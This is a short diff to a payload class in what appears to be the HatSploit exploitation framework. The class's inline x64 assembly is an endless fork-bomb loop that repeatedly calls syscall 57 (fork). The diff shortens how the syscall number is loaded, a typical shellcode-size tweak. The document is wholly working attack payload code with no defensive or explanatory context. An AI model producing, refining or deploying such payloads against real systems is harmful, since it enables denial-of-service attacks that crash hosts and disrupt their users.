@@ -29,8 +29,8 @@ class HatSploitPayload(Payload, PayloadTools):
             self.details['Architecture'],
             """
             start:
-                xor rax, rax
-                add rax, 57
+                push 0x39
+                pop rax
                 syscall
                 jmp start
             """
